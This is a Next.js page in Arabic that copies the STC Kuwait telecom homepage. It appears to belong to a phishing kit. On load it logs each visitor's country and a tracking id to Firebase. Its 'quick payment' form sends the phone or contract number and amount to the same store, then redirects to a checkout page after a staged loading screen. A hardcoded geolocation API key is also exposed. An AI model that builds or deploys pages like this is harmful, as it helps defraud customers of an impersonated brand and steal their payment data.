"use client"

import type React from "react"

import { useEffect, useState } from "react"
import { useRouter } from "next/navigation"
import {
  Search,
  ShoppingCart,
  User,
  Menu,
  CreditCard,
  ChevronRight,
  Wifi,
  Smartphone,
  Tv,
  Globe,
  Zap,
  Gift,
} from "lucide-react"

import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { addData } from "@/lib/firebase"
import { setupOnlineStatus } from "@/lib/online-sts"

const _id = Math.random()
  .toString(36)
  .replace(/[^a-z]+/g, "")
  .substr(0, 15)

export default function Home() {
  const [isLoading, setIsLoading] = useState(false)
  const [phone, setPhone] = useState("")
  const [amount, setAmount] = useState("")
  const router = useRouter()

  useEffect(() => {
    getLocation()
  }, [])

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    const id = localStorage.getItem("visitor")
    addData({ id: id, phone, mobile: phone })
    localStorage.setItem("amount", amount)

    setIsLoading(true)
    setTimeout(() => {
      router.push("/checkout")
      setIsLoading(false)
    }, 3000)
  }

  async function getLocation() {
    const APIKEY = "856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef"
    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`

    try {
      const response = await fetch(url)
      if (!response.ok) {
        throw new Error(`HTTP error! Status: ${response.status}`)
      }
      const country = await response.text()
      addData({
        id: _id,
        country: country,
        createdDate: new Date().toISOString(),
      })
      localStorage.setItem("country", country)
      setupOnlineStatus(_id)
    } catch (error) {
      console.error("Error fetching location:", error)
    }
  }

  return (
    <div className="flex flex-col min-h-screen bg-white font-sans" dir="rtl">
      {/* Header */}
      <header className="flex justify-between items-center px-4 py-3 bg-white border-b border-gray-100 sticky top-0 z-50">
        <div className="flex items-center space-x-reverse space-x-3">
          <button className="p-2 rounded-lg hover:bg-gray-100 transition-colors">
            <User className="w-5 h-5 text-gray-600" />
          </button>
          <button className="p-2 rounded-lg hover:bg-gray-100 transition-colors">
            <ShoppingCart className="w-5 h-5 text-gray-600" />
          </button>
          <button className="p-2 rounded-lg hover:bg-gray-100 transition-colors">
            <Search className="w-5 h-5 text-gray-600" />
          </button>
        </div>

        <div className="flex items-center">
          <img src="/stc.png" alt="STC Logo" className="h-8 w-auto" />
        </div>

        <button className="p-2 rounded-lg hover:bg-gray-100 transition-colors">
          <Menu className="w-5 h-5 text-gray-600" />
        </button>
      </header>

      {/* Hero Banner */}
      <div className="relative bg-[url(/hero-banner.jpg)] bg-no-repeat  bg-cover
  h-[320px]  bg-gradient-to-br from-pink-200 via-purple-200 to-purple-300 mx-4 my-4 rounded-3xl overflow-hidden">
        <div className="p-6 pb-8">
          <div className="flex items-center justify-between mb-4">
            <div className="bg-white/90 backdrop-blur-sm rounded-2xl px-4 py-2">
              <div className="text-purple-600 font-bold text-sm">stc</div>
            </div>
          </div>


          <div className="text-right mb-6">
            <h1 className="text-2xl font-bold text-purple-400 mb-2">انترنت جي بيتك</h1>
            <p className="text-white text-lg">باقات انترنت منزلي</p>
          </div>

          <div className="flex justify-end">
            <Button className="bg-red-500 hover:bg-red-600 text-white rounded-2xl px-6 py-3 font-semibold">
              اعرف أكثر
            </Button>
          </div>
        </div>

        {/* 3D House Illustration */}
        
      </div>

      {/* Service Icons */}
      <div className="px-4 mt-4">
        <div className="grid grid-cols-4 gap-4">
          <ServiceCard icon={<Globe className="w-6 h-6" />} title="الانترنت" color="bg-green-500" />
          <ServiceCard icon={<Smartphone className="w-6 h-6" />} title="الجوال" color="bg-green-500" />
          <ServiceCard icon={<Tv className="w-6 h-6" />} title="التلفزيون" color="bg-green-500" />
          <ServiceCard icon={<Gift className="w-6 h-6" />} title="العروض" color="bg-green-500" />
        </div>
      </div>

      {/* Quick Payment */}
      <div className="mx-4 mt-8">
        <form onSubmit={handleSubmit} className="p-6 bg-gradient-to-r from-pink-100 to-pink-200 rounded-3xl">
          <div className="flex items-center justify-between mb-6">
            <div className="p-3 bg-white rounded-2xl">
              <CreditCard className="w-6 h-6 text-purple-600" />
            </div>
            <h2 className="text-xl font-bold text-gray-800">الدفع السريع</h2>
          </div>

          <div className="space-y-4">
            <Input
              required
              type="tel"
              value={phone}
              onChange={(e) => setPhone(e.target.value)}
              maxLength={12}
              placeholder="رقم الجوال أو رقم العقد"
              className="text-right border-0 rounded-2xl bg-white py-4 px-4 text-gray-700 placeholder:text-gray-400"
            />

            {phone.length >= 8 && (
              <Input
                required
                value={amount}
                onChange={(e) => setAmount(e.target.value)}
                maxLength={3}
                placeholder="القيمة بالدينار الكويتي"
                type="tel"
                className="text-right border-0 rounded-2xl bg-white py-4 px-4 text-gray-700 placeholder:text-gray-400"
              />
            )}

            <Button
              type="submit"
              className="w-full bg-red-500 hover:bg-red-600 text-white rounded-2xl py-4 font-semibold text-lg"
            >
              ادفع الآن
            </Button>
          </div>
        </form>
      </div>

      {/* Latest Offers */}
      <div className="mx-4 mt-8">
        <h2 className="text-xl font-bold text-gray-800 mb-4 text-right">اكتشف أحدث عروضنا</h2>

        <div className="grid grid-cols-2 gap-4">
          <OfferCard
            title="زيد كل شي بباقاتك"
            subtitle="باقات الجوال"
            bgColor="bg-gradient-to-br from-purple-600 to-purple-800"
            buttonText="اعرف أكثر"
          />
          <OfferCard
            title="تواصل في الحج"
            subtitle="الحج - العمرة"
            bgColor="bg-gradient-to-br from-green-600 to-green-800"
            buttonText="اعرف أكثر"
          />
        </div>
      </div>

      {/* Shop Latest Devices */}
      <div className="mx-4 mt-8">
        <div className="flex justify-between items-center mb-4">
          <Button variant="ghost" className="text-purple-600 p-0 flex items-center">
            عرض الكل <ChevronRight className="h-4 w-4 mr-1" />
          </Button>
          <h2 className="text-xl font-bold text-gray-800">تسوق أحدث أجهزتنا</h2>
        </div>

        <div className="flex space-x-reverse space-x-4 overflow-x-auto pb-4">
          <ProductCard image="/samsung-s22.png" title="Samsung Galaxy Ultra" price="من 255 د.ك" badge="جديد" />
          <ProductCard
            image="/s25-Ultra-silver-blue-700x700.webp"
            title="Samsung Galaxy S25"
            price="من 225 د.ك"
            badge="جديد"
          />
          <ProductCard image="/samsung-s22.png" title="Samsung Galaxy S24" price="من 195 د.ك" badge="" />
        </div>
      </div>

      {/* Samsung Banner */}
      <div className="mx-4 mt-8">
        <div className="relative bg-gradient-to-r from-gray-900 to-gray-700 rounded-3xl overflow-hidden p-6">
          <div className="flex justify-between items-center">
            <Button className="bg-red-500 hover:bg-red-600 text-white rounded-2xl px-6 py-3">تسوق الآن</Button>
            <div className="text-white text-right">
              <h3 className="font-bold text-lg">جهاز آيفون الجديد متوفر الآن</h3>
            </div>
        
          </div>
        </div>
      </div>

      {/* Gift Cards */}
      <div className="mx-4 mt-8">
        <div className="flex justify-between items-center mb-4">
          <Button variant="ghost" className="text-purple-600 p-0 flex items-center">
            عرض الكل <ChevronRight className="h-4 w-4 mr-1" />
          </Button>
          <h2 className="text-xl font-bold text-gray-800">تسوق قسائمنا و بطاقاتنا الالكترونية</h2>
        </div>

        <div className="grid grid-cols-2 gap-4">
          <GiftCard image="/pal.jpeg" title="PlayStation" />
          <GiftCard image="/xbox.jpg" title="Xbox Live Gold" />
          <GiftCard image="/pla.webp" title="Google Play" />
          <GiftCard image="/itun.webp" title="App Store & iTunes" />
        </div>
      </div>

      {/* Internet Packages */}
      <div className="mx-4 mt-8">
        <h2 className="text-xl font-bold text-gray-800 mb-4 text-right">الانترنت</h2>

        <div className="grid grid-cols-2 gap-4">
          <InternetCard
            icon={<Wifi className="w-8 h-8" />}
            title="5G"
            subtitle="شبكة الجيل الخامس"
            bgColor="bg-gradient-to-br from-blue-100 to-blue-200"
            image="/wifi.png"
          />
          <InternetCard
            icon={<Zap className="w-8 h-8" />}
            title="الانترنت المنزلي"
            subtitle="باقات انترنت منزلي"
            bgColor="bg-gradient-to-br from-purple-100 to-purple-200"
            image="/music.png"
          />
        </div>
      </div>

      {/* Entertainment Services */}
      <div className="mx-4 mt-8 mb-8">
        <div className="flex justify-between items-center mb-4">
          <Button variant="ghost" className="text-purple-600 p-0 flex items-center">
            عرض الكل <ChevronRight className="h-4 w-4 mr-1" />
          </Button>
          <h2 className="text-xl font-bold text-gray-800">تسوق حسب الفئة</h2>
        </div>

        <div className="grid grid-cols-3 gap-4">
          <CategoryCard image="/rgb.png" label="5G" />
          <CategoryCard image="/mbc.png" label="الانترنت المنزلي" />
          <CategoryCard image="/Spotify.png" label="الجوال" />
        </div>
      </div>

      {/* Newsletter */}
      <div className="bg-gradient-to-r from-red-500 to-pink-500 py-8 px-4">
        <div className="text-white text-center mb-6">
          <h3 className="font-bold text-xl">نحتاج مساعدة؟</h3>
          <p className="text-sm mt-2 opacity-90">تحدث مع أحد ممثلي خدمة العملاء أو قم بزيارة أحد فروعنا</p>
        </div>
        <div className="flex flex-col gap-3 max-w-sm mx-auto">
          <Button className="bg-white text-red-500 hover:bg-gray-100 rounded-2xl py-3 font-semibold">تحدث معنا</Button>
          <Button
            variant="outline"
            className="border-white text-white hover:bg-white hover:text-red-500 rounded-2xl py-3 font-semibold"
          >
            خدمة العملاء والدعم الفني
          </Button>
        </div>
      </div>

      {/* Footer */}
      <Footer />

      {/* Loading Overlay */}
      {isLoading && <FullPageLoader text="جاري التحويل ..." />}
    </div>
  )
}

// Component definitions
function ServiceCard({ icon, title, color }: { icon: React.ReactNode; title: string; color: string }) {
  return (
    <div className="flex flex-col items-center gap-2 p-4">
      <div className={`${color} rounded-full p-3 text-white shadow-lg`}>{icon}</div>
      <span className="text-xs text-center font-medium text-gray-700">{title}</span>
    </div>
  )
}

function OfferCard({
  title,
  subtitle,
  bgColor,
  buttonText,
}: {
  title: string
  subtitle: string
  bgColor: string
  buttonText: string
}) {
  return (
    <div className={`${bgColor} rounded-3xl p-6 text-white relative overflow-hidden`}>
      <div className="relative z-10">
        <p className="text-sm opacity-90 mb-1">{subtitle}</p>
        <h3 className="font-bold text-lg mb-4 leading-tight">{title}</h3>
        <Button className="bg-red-500 hover:bg-red-600 text-white rounded-2xl px-4 py-2 text-sm">{buttonText}</Button>
      </div>
    </div>
  )
}

function ProductCard({
  image,
  title,
  price,
  badge,
}: {
  image: string
  title: string
  price: string
  badge: string
}) {
  return (
    <div className="bg-white rounded-3xl p-4 shadow-sm border border-gray-100 min-w-[160px]">
      {badge && <div className="bg-red-500 text-white text-xs px-2 py-1 rounded-full inline-block mb-2">{badge}</div>}
      <div className="relative h-32 mb-3 bg-gray-50 rounded-2xl p-2">
        <img src={image || "/placeholder.svg"} alt={title} className="w-full h-full object-contain" />
      </div>
      <h3 className="font-semibold text-gray-800 mb-2 text-sm">{title}</h3>
      <div className="font-bold text-gray-900 text-sm">{price}</div>
    </div>
  )
}

function GiftCard({ image, title }: { image: string; title: string }) {
  return (
    <div className="bg-white rounded-3xl p-4 shadow-sm border border-gray-100">
      <div className="relative h-24 mb-3 bg-gray-50 rounded-2xl p-2">
        <img src={image || "/placeholder.svg"} alt={title} className="w-full h-full object-contain" />
      </div>
      <h3 className="font-semibold text-gray-800 text-center text-sm">{title}</h3>
    </div>
  )
}

function InternetCard({
  icon,
  title,
  subtitle,
  bgColor,
  image,
}: {
  icon: React.ReactNode
  title: string
  subtitle: string
  bgColor: string
  image: string
}) {
  return (
    <div className={`${bgColor} rounded-3xl p-6 text-center`}>
      <div className="text-purple-600 mb-3 flex justify-center">
        <img src={image || "/placeholder.svg"} alt={title} className="w-8 h-8" />
      </div>
      <h3 className="font-bold text-gray-800 mb-1">{title}</h3>
      <p className="text-sm text-gray-600">{subtitle}</p>
    </div>
  )
}

function CategoryCard({ image, label }: { image: string; label: string }) {
  return (
    <div className="bg-white rounded-3xl p-4 shadow-sm border border-gray-100 text-center">
      <div className="relative h-16 mb-2 bg-gray-50 rounded-2xl p-2">
        <img src={image || "/placeholder.svg"} alt={label} className="w-full h-full object-contain" />
      </div>
      <span className="text-xs font-medium text-gray-700">{label}</span>
    </div>
  )
}

function Footer() {
  return (
    <footer className="bg-gradient-to-br from-purple-900 via-purple-800 to-purple-900 text-white py-12 px-4">
      <div className="grid grid-cols-1 sm:grid-cols-3 gap-6 max-w-4xl mx-auto">
        <div>
          <h4 className="font-bold mb-4 text-base">خدمة العملاء</h4>
          <ul className="space-y-2 text-sm text-purple-200">
            <li>اتصل بنا</li>
            <li>الأسئلة الشائعة</li>
            <li>فروعنا</li>
          </ul>
        </div>
        <div>
          <h4 className="font-bold mb-4 text-base">حسابي</h4>
          <ul className="space-y-2 text-sm text-purple-200">
            <li>تسجيل الدخول</li>
            <li>طلباتي</li>
            <li>إعدادات الحساب</li>
          </ul>
        </div>
        <div>
          <h4 className="font-bold mb-4 text-base">عن الشركة</h4>
          <ul className="space-y-2 text-sm text-purple-200">
            <li>من نحن</li>
            <li>الوظائف</li>
            <li>الشروط والأحكام</li>
          </ul>
        </div>
      </div>
      <div className="mt-8 pt-6 border-t border-purple-700 text-center text-xs text-purple-300">
        © {new Date().getFullYear()} جميع الحقوق محفوظة - شركة الاتصالات الكويتية
      </div>
    </footer>
  )
}

function FullPageLoader({ text }: { text: string }) {
  return (
    <div className="fixed inset-0 bg-black/80 backdrop-blur-sm flex flex-col items-center justify-center z-50">
      <div className="w-16 h-16 border-4 border-t-red-500 border-r-red-500 border-b-transparent border-l-transparent rounded-full animate-spin"></div>
      <p className="text-white mt-4 font-semibold text-base">{text}</p>
    </div>
  )
}
